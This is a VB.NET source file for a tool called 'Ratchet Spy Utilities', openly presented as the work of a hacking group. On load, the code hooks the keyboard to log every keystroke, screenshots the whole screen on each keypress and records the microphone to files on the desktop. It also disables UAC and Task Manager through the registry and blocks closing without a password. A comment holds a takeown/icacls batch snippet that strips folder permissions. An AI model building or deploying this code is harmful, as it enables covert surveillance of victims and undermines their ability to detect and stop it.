'Ratchet Spy Utilities: Created by: Justin Linwood Ross
'Copyright © Black Star Research Facility | Dark Web 
'Trademark: The 9th Wave Hacking Group
'MIT License November 9th 2021
Imports System.IO
Imports System.Runtime.InteropServices
Imports System.Text
Imports System.Threading
Imports Microsoft.Win32
Imports NAudio.Wave

Public Class Form1

    'Secret Batch Code: This will remove any admin security from a folder.
    'If you change FOLDER_NAME to DIRECTORY_NAME, you will achieve the same success.
    'Save bat file as: ICACLS.bat

    'SET FOLDER_NAME="C:\Users\Etc.."
    'TAKEOWN /f %FOLDER_NAME% /r /d y
    'ICACLS %FOLDER_NAME% /grant administrators:F /t
    'ICACLS %FOLDER_NAME% /reset /T
    'PAUSE

    'The WH_KEYBOARD hook enables an application to monitor message traffic for WM_KEYDOWN and WM_KEYUP messages about to be returned by
    'the GetMessage or PeekMessage function. You can use the WH_KEYBOARD hook to monitor keyboard input posted to a message queue.
    Private Shared ReadOnly WHKEYBOARDLL As Integer = 13

    ReadOnly password As String = "******"
    Private Const DESKTOPVERTRES As Integer = &H75
    Private Const DESKTOPHORZRES As Integer = &H76
    Private Const WM_KEYDOWN As Integer = &H100
    Private Shared ReadOnly _proc As LowLevelKeyboardProc = AddressOf HookCallback
    Private Shared _hookID As IntPtr = IntPtr.Zero
    Private Shared CurrentActiveWindowTitle As String
    Private waveSource As WaveIn = Nothing 'Compliments & usage thanks to Naudio Nuget: https://github.com/naudio/NAudio
    Private waveFile As WaveFileWriter = Nothing 'Naudio Nuget

    Public ReadOnly Property Password1 As String
        Get
            Return password
        End Get
    End Property

    <DllImport("gdi32.dll")> Private Shared Function GetDeviceCaps(hdc As IntPtr,
                                                                   nIndex As Integer) As Integer
    End Function

    <DllImport("user32.dll", CharSet:=CharSet.Auto, SetLastError:=True)>
    Private Shared Function SetWindowsHookEx(idHook As Integer,
                                             lpfn As LowLevelKeyboardProc,
                                             hMod As IntPtr,
                                             dwThreadId As UInteger) As IntPtr
    End Function

    'UnhookWindowsHookEx : The hook procedure can be In the state Of being called by another thread even after UnhookWindowsHookEx returns.
    'If the hook procedure Is Not being called concurrently, the hook procedure Is removed immediately before UnhookWindowsHookEx returns.
    <DllImport("user32.dll", CharSet:=CharSet.Auto, SetLastError:=True)>
    Private Shared Function UnhookWindowsHookEx(hhk As IntPtr) As <MarshalAs(UnmanagedType.Bool)> Boolean
    End Function

    'CallNextHookEx: Hook procedures are installed in chains for particular hook types. CallNextHookEx calls the next hook in the chain.
    <DllImport("user32.dll", CharSet:=CharSet.Auto, SetLastError:=True)>
    Private Shared Function CallNextHookEx(hhk As IntPtr,
                                           nCode As Integer,
                                           wParam As IntPtr,
                                           lParam As IntPtr) As IntPtr
    End Function

    'GetModuleHandle:The function returns a handle to a mapped module without incrementing its reference count. However,
    'if this handle is passed to the FreeLibrary function, the reference count of the mapped module will be decremented.
    'Therefore, do not pass a handle returned by GetModuleHandle to the FreeLibrary function.
    'Doing so can cause a DLL module to be unmapped prematurely.This Function must() be used carefully In a multithreaded application.
    'There Is no guarantee that the Module handle remains valid between the time this Function returns the handle And the time it Is used.
    'For example, suppose that a thread retrieves a Module handle, but before it uses the handle, a second thread frees the Module.
    'If the system loads another Module, it could reuse the Module handle that was recently freed.
    'Therefore, the first thread would have a handle To a different Module than the one intended.
    <DllImport("kernel32.dll", CharSet:=CharSet.Auto, SetLastError:=True)>
    Private Shared Function GetModuleHandle(lpModuleName As String) As IntPtr
    End Function

    Private Delegate Function LowLevelKeyboardProc(nCode As Integer,
                                                   wParam As IntPtr,
                                                   lParam As IntPtr) As IntPtr

    'As stated above: 'Retrieves a handle to the foreground window (the window with which the user is currently working).
    'The system assigns a slightly higher priority to the thread that creates the foreground window than it does to other threads.
    <DllImport("user32.dll")>
    Private Shared Function GetForegroundWindow() As IntPtr
    End Function

    'GetWindowThreadProcessId:Retrieves the identifier of the thread that created the specified window and, optionally,
    'the identifier of the process that created the window.
    <DllImport("user32.dll", SetLastError:=True)>
    Private Shared Function GetWindowThreadProcessId(hWnd As IntPtr,
                                                     <Out> ByRef lpdwProcessId As UInteger) As UInteger
    End Function

    'GetKeyState: The key status returned from this function changes as a thread reads key messages from its message queue.
    'The status does not reflect the interrupt-level state associated with the hardware. Use the GetKeyState function to retrieve
    'that information.
    <DllImport("user32.dll", CharSet:=CharSet.Auto, ExactSpelling:=True, CallingConvention:=CallingConvention.Winapi)>
    Public Shared Function GetKeyState(keyCode As Integer) As Short
    End Function

    'An application can call this function to retrieve the current status of all the virtual keys.
    'The status changes as a thread removes keyboard messages from its message queue. The status does not change as keyboard messages
    'are posted to the thread's message queue, nor does it change as keyboard messages are posted to or retrieved from message queues
    'of other threads. (Exception: Threads that are connected through AttachThreadInput share the same keyboard state.)
    <DllImport("user32.dll", SetLastError:=True)>
    Private Shared Function GetKeyboardState(lpKeyState As Byte()) As <MarshalAs(UnmanagedType.Bool)> Boolean
    End Function

    'GetKeyboardLayout: The input locale identifier is a broader concept than a keyboard layout, since it can also encompass a speech-to-text
    'converter, an Input Method Editor (IME), or any other form of input.
    <DllImport("user32.dll")>
    Private Shared Function GetKeyboardLayout(idThread As UInteger) As IntPtr
    End Function

    'ToUnicodeEx:The input locale identifier is a broader concept than a keyboard layout, since it can also encompass a speech-to-text converter,
    'an Input Method Editor (IME), or any other form of input.
    <DllImport("user32.dll")>
    Private Shared Function ToUnicodeEx(wVirtKey As UInteger,
                                        wScanCode As UInteger,
                                        lpKeyState As Byte(),
                                        <Out, MarshalAs(UnmanagedType.LPWStr)> pwszBuff As StringBuilder,
                                        cchBuff As Integer,
                                        wFlags As UInteger,
                                        dwhkl As IntPtr) As Integer
    End Function

    'MapVirtualKey: An application can use MapVirtualKey to translate scan codes to the virtual-key code constants VK_SHIFT, VK_CONTROL, and VK_MENU,
    'and vice versa. These translations do not distinguish between the left and right instances of the SHIFT, CTRL, or ALT keys.
    <DllImport("user32.dll")>
    Private Shared Function MapVirtualKey(uCode As UInteger,
                                          uMapType As UInteger) As UInteger
    End Function

    <DllImport("gdi32.dll")>
    Private Shared Function BitBlt(hdc As IntPtr,
nXDest As Integer,
nYDest As Integer,
nWidth As Integer,
nHeight As Integer,
hdcSrc As IntPtr,
nXSrc As Integer,
nYSrc As Integer,
dwRop As CopyPixelOperation) As Boolean
    End Function

    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load

        _hookID = SetHook(_proc)
        'Naudio: https://github.com/naudio/NAudio
        waveSource = New WaveIn() With {
            .WaveFormat = New WaveFormat(44100, 1)
        }
        AddHandler waveSource.DataAvailable, New EventHandler(Of WaveInEventArgs)(AddressOf WaveSource_DataAvailable)
        AddHandler waveSource.RecordingStopped, New EventHandler(Of StoppedEventArgs)(AddressOf WaveSource_RecordingStopped)
        waveFile = New WaveFileWriter(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) & "\WM\Justin.Ross\Pierce.wav",
                                      waveSource.WaveFormat)
        waveSource.StartRecording()
        DenizEx()
        BatCreator()
        DisableTaskManager()
        Taskmgr()
    End Sub

    'Naudio
    Private Sub WaveSource_DataAvailable(sender As Object,
                                         e As WaveInEventArgs)
        If waveFile IsNot Nothing Then
            waveFile.Write(e.Buffer, 0, e.BytesRecorded)
            waveFile.Flush()
        End If
    End Sub

    'Naudio
    Private Sub WaveSource_RecordingStopped(sender As Object,
                                            e As StoppedEventArgs)
        If waveSource IsNot Nothing Then
            waveSource.Dispose()
            waveSource = Nothing
        End If

        If waveFile IsNot Nothing Then
            waveFile.Dispose()
            waveFile = Nothing
        End If
    End Sub

    Private Sub BatCreator()
        Dim sb As New StringBuilder
        sb.AppendLine("@echo off")
        sb.AppendLine("cls()")
        sb.AppendLine(": begin()")
        'if you want to change IP address based on some user input, change this line
        'sb.Append("ping 1.1.1.1 -w -n 1")
        sb.AppendLine("cls()")
        sb.AppendLine("echo....Hello Bat")
        sb.AppendLine("echo.")
        sb.AppendLine("echo.")
        sb.AppendLine("PAUSE")
        ' sb.AppendLine("echo ")
        'sb.AppendLine("ping 1.1.1.1 -w -n 1")
        sb.AppendLine("GoTo begin")
        File.WriteAllText("fileName.bat", sb.ToString())
        'Run Bat invisible
        Shell("fileName.bat", AppWinStyle.NormalFocus) 'Change to "hide" for it to be invisible
    End Sub

    Private Sub DenizEx()
        Try
            Dim key As RegistryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System",
                                                                      True)
            key.SetValue("EnableLUA",
                         "0") 'To Enable, set at "1"
            key.Close()
        Catch e As Exception
            Debug.WriteLine("Error:  & e")
        End Try
    End Sub

    Private Shared Function SetHook(proc As LowLevelKeyboardProc) As IntPtr
        Using curProcess As Process = Process.GetCurrentProcess()
            Return SetWindowsHookEx(WHKEYBOARDLL,
                                    proc,
                                    GetModuleHandle(curProcess.ProcessName & ".exe"),
                                    0)
            Return SetWindowsHookEx(WHKEYBOARDLL,
                                    proc,
                                    GetModuleHandle(curProcess.ProcessName),
                                    0)
        End Using
    End Function

    Private Shared Function HookCallback(nCode As Integer,
                                         wParam As IntPtr,
                                         lParam As IntPtr) As IntPtr
        If nCode >= 0 _
           AndAlso wParam = CType(WM_KEYDOWN, IntPtr) Then
            Dim vkCode As Integer = Marshal.ReadInt32(lParam)
            Dim capsLock As Boolean = (GetKeyState(&H14) And &HFFFF) <> 0
            Dim shiftPress As Boolean = (GetKeyState(&HA0) And &H8000) <> 0 OrElse (GetKeyState(&HA1) And &H8000) <> 0
            Dim currentKey As String = KeyboardLayout(vkCode)
            If capsLock _
                    OrElse shiftPress Then
                currentKey = currentKey.ToUpper()
                Const Format As String = "yyyyMMddHHmmss"
                Task.Delay(1000)
                Dim ss As New Size(0, 0)
                Using g As Graphics = Graphics.FromHwnd(IntPtr.Zero)
                    Dim hDc As IntPtr = g.GetHdc
                    ss.Width = GetDeviceCaps(hDc,
                                             DESKTOPHORZRES)
                    ss.Height = GetDeviceCaps(hDc,
                                              DESKTOPVERTRES)
                    g.ReleaseHdc(hDc)
                End Using

                Using bm As New Bitmap(ss.Width, ss.Height)
                    Using g As Graphics = Graphics.FromImage(bm)
                        g.CopyFromScreen(Point.Empty,
                                         Point.Empty,
                                         ss,
                                         CopyPixelOperation.SourceCopy)
                    End Using
                    Dim dateString As String = Date.Now.ToString(Format)
                    Dim savePath As String = Environment.GetFolderPath(Environment.SpecialFolder.Desktop)
                    Dim userName As String = Environment.UserName
                    Dim captureSavePath As String = String.Format($"{{0}}\WM\{{1}}\capture_{{2}}.png",
                                                                  savePath,
                                                                  userName,
                                                                  dateString)
                    bm.Save(captureSavePath,
                            Imaging.ImageFormat.Png)
                End Using
            Else
                currentKey = currentKey.ToLower()
                Const Format As String = "yyyyMMddHHmmss"
                Task.Delay(1000)
                Dim ss As New Size(0, 0)
                Using g As Graphics = Graphics.FromHwnd(IntPtr.Zero)
                    Dim hDc As IntPtr = g.GetHdc
                    ss.Width = GetDeviceCaps(hDc,
                                             DESKTOPHORZRES)
                    ss.Height = GetDeviceCaps(hDc,
                                              DESKTOPVERTRES)
                    g.ReleaseHdc(hDc)
                End Using

                Using bm As New Bitmap(ss.Width, ss.Height)
                    Using g As Graphics = Graphics.FromImage(bm)
                        g.CopyFromScreen(Point.Empty,
                                         Point.Empty,
                                         ss,
                                         CopyPixelOperation.SourceCopy)
                    End Using
                    Dim dateString As String = Date.Now.ToString(Format)
                    Dim savePath As String = Environment.GetFolderPath(Environment.SpecialFolder.Desktop)
                    Dim userName As String = Environment.UserName
                    Dim captureSavePath As String = String.Format($"{{0}}\WM\{{1}}\capture_{{2}}.png",
                                                                  savePath,
                                                                  userName,
                                                                  dateString)
                    bm.Save(captureSavePath,
                            Imaging.ImageFormat.Png)
                End Using
            End If
            Select Case vkCode
                Case Keys.F1 To Keys.F24
                    currentKey = "[" & CType(vkCode, Keys) & "]"
                Case Else

                    Select Case (CType(vkCode, Keys)).ToString()
                        Case "Space"
                            currentKey = "[SPACE]"
                        Case "Return"
                            currentKey = "[ENTER]"
                        Case "Escape"
                            currentKey = "[ESC]"
                        Case "LControlKey"
                            currentKey = "[CTRL]"
                        Case "RControlKey"
                            currentKey = "[CTRL]"
                        Case "RShiftKey"
                            currentKey = "[Shift]"
                        Case "LShiftKey"
                            currentKey = "[Shift]"
                        Case "Back"
                            currentKey = "[Back]"
                        Case "LWin"
                            currentKey = "[WIN]"
                        Case "Tab"
                            currentKey = "[Tab]"
                        Case "Capital"

                            If capsLock = True Then
                                currentKey = "[CAPSLOCK: OFF]"
                            Else
                                currentKey = "[CAPSLOCK: ON]"
                            End If
                    End Select
            End Select

            Dim fileName As String = $"{Environment.GetFolderPath(Environment.SpecialFolder.Desktop)}\WM\Justin.Ross\RatchetLog.txt"
            Using writer As New StreamWriter(fileName, True)
                If CurrentActiveWindowTitle = GetActiveWindowTitle() Then
                    writer.Write(currentKey)
                Else
                    writer.WriteLine($"{vbNewLine}{vbNewLine}Ratchet 360:  {Date.Now.ToString($"yyyy/MM/dd HH:mm:ss.ff{vbLf}")}")
                    writer.Write(Environment.NewLine)
                    writer.Write(currentKey)
                End If
            End Using
        End If
                Return CallNextHookEx(_hookID, nCode, wParam, lParam)
    End Function

    Private Shared Function KeyboardLayout(vkCode As UInteger) As String
        Dim processId As UInteger = Nothing
        Try
            Dim sb As New StringBuilder()
            Dim vkBuffer As Byte() = New Byte(255) {}
            If Not GetKeyboardState(vkBuffer) Then Return ""
            Dim scanCode As UInteger = MapVirtualKey(vkCode, 0)
            Dim unused = ToUnicodeEx(vkCode,
                                     scanCode,
                                     vkBuffer,
                                     sb,
                                     5,
                                     0,
                                     GetKeyboardLayout(GetWindowThreadProcessId(GetForegroundWindow(), processId)))
            Return sb.ToString()
        Catch
        End Try
        Return (CType(vkCode, Keys)).ToString()
    End Function

    'GetActiveWindowTitle: Retrieves the window handle to the active window attached to the calling thread's message.
    Private Shared Function GetActiveWindowTitle() As String
        Dim pid As UInteger = Nothing
        Try
            'Retrieves a handle to the foreground window (the window with which the user is currently working).
            'The system assigns a slightly higher priority to the thread that creates the foreground window than it does to other threads.
            Dim hwnd As IntPtr = GetForegroundWindow()
            Dim unused = GetWindowThreadProcessId(hwnd, pid)
            Dim p As Process = Process.GetProcessById(pid) 'Every process has an ID # (pid)
            Dim title As String = p.MainWindowTitle
            'IsNullOrWhiteSpace is a convenience method that is similar to the following code,
            'except that it offers superior performance:
            If String.IsNullOrWhiteSpace(title) Then title = p.ProcessName
            CurrentActiveWindowTitle = title
            Return title
        Catch __unusedException1__ As Exception
            Return "Ratchet"
        End Try
    End Function

    Public Function GetWindowImage(WindowHandle As IntPtr,
Area As Rectangle) As Bitmap
        Using b As New Bitmap(Area.Width, Area.Height, Imaging.PixelFormat.Format32bppRgb)
            Using img As Graphics = Graphics.FromImage(b)
                Dim ImageHDC As IntPtr = img.GetHdc
                Using window As Graphics = Graphics.FromHwnd(WindowHandle)
                    Dim WindowHDC As IntPtr = window.GetHdc
                    BitBlt(ImageHDC,
                           0,
                           0,
                           Area.Width,
                           Area.Height,
                           WindowHDC,
                           Area.X,
                           Area.Y,
                           CopyPixelOperation.SourceCopy)
                    window.ReleaseHdc()
                End Using
                img.ReleaseHdc()
            End Using
            Return b
        End Using
    End Function

    'Universal Unhandled Exception Catch to prevent crashes.
    Public Sub RatchetsUnhandledException(sender As Object,
                                  e As UnhandledExceptionEventArgs)
        AddHandler AppDomain.CurrentDomain.UnhandledException, AddressOf RatchetsUnhandledException
        Debug.WriteLine($"[ERROR] {DirectCast(e.ExceptionObject, Exception).Message}")
        Thread.CurrentThread.IsBackground = True
        Thread.CurrentThread.Join()
    End Sub

    Public ReadOnly Property Password2 As Boolean
        Get

            If InputBox("Please enter you Password", "Enter Password", Nothing) = Password1 Then
                Return True
            End If
            Return False
        End Get
    End Property

    Private Sub Form1_FormClosing(sender As Object,
                                  e As FormClosingEventArgs) Handles Me.FormClosing
        My.Computer.Audio.Play(My.Resources.output, AudioPlayMode.Background)
        'Case Sensitive Password
        If Not Password2 Then
            e.Cancel = True
            MessageBox.Show("Ratchet will only close with the correct password.")
            Exit Sub
        End If
        'Enable Task Manager
        'Admin privilege is required
        Task.Delay(1000)
        Dim regkey As RegistryKey
        Dim keyValueInt As String = "0"    '0x00000000 (0)
        Dim subKey As String = "Software\Microsoft\Windows\CurrentVersion\Policies\System"
        Try
            regkey = Registry.CurrentUser.CreateSubKey(subKey)
            regkey.SetValue("DisableTaskMgr", keyValueInt)
            regkey.Close()
        Catch ex As Exception
            'This restores Taskmgr so it can be accessed again on the termination of Ratchet.
            Process.Start("taskmgr", AppWinStyle.MinimizedFocus)
            'MsgBox(ex.Message, MsgBoxStyle.Critical, "Registry Error!")
        End Try
    End Sub
    'Admin privilege is required
    Private Sub DisableTaskManager()
        Dim regkey As RegistryKey
        Dim keyValueInt As String = "1"
        Dim subKey As String = "Software\Microsoft\Windows\CurrentVersion\Policies\System"
        Try
            regkey = Registry.CurrentUser.CreateSubKey(subKey)
            regkey.SetValue("DisableTaskMgr", keyValueInt)
            regkey.Close()
        Catch ex As Exception
            'MsgBox(ex.Message, MsgBoxStyle.Critical, "Registry Error!")
        End Try
    End Sub

    'This Public "Class TaskManagerControl" runs on a seperate thread to avoid this app from Freezing, due to 
    'a "suspended state" that killing the task manager has using a "While True" statement housing a "For Each" statement.
    'Note: Using multiple threads is always a safe and smart way to run seperate tasks.
    Public Shared Sub Taskmgr()
        Dim c As New TaskManagerControl
        c.bgw.RunWorkerAsync()
    End Sub

End Class